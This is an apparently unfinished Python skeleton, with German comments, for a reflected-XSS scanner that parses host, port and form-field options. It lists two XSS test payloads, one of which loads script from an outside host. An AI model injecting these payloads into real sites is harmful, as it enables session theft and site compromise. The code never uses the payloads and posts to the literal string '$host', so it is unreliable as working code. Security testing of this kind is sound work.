#!/usr/bin/env python3


#Hier werden alle Bibliotheken angegeben, die für das Programm benötigt und importiert werden
import requests
import argparse
import sys
import logging



#Einleseprozess
#Parameterliste und Eingabeparser für die Initialdaten
parser = argparse.ArgumentParser(
    description="XSS Scanner, for the testing of Reflected XSS Vulnerabilities in Websites"
)

parser.add_argument(
    "host", nargs="?", help="Host to perform the test on"
)

parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)

parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)

parser.add_argument(
    "-f",
    "--field",
    dest="field",
    action="store_true",
    help="This will be used for the field form like name, surname, city",
)

parser.add_argument(
    "-l",
    "--list",
    dest="list",
    action="store_true",
    help="This will be used for the entry in the field form like selected from a XSS-list",
)

parser.set_defaults(https=False)
args = parser.parse_args()



#Exceptionhandling
#wenn zu wenig argumente ausgewählt werden bricht das Programm ab und gibt die Help Parameter aus
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if not args.field:
    print("Field required!")
    parser.print_help()
    sys.exit(1)


if args.https:
    logging.info("Importing ssl module")
    import ssl



#Datatype List. Dies sind die Teststrings die ausgeführt werden, um die XSS Schwachstelle zu testen
list_of_strings = []
xss_strings = [
    '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
]






#Einlesen der xss_teststring datei


request = requests.post('$host', data = {'field1':'name'})

payload = {'field1': 'name', 'field2': 'street'}
request = requests.post('$host', params = payload)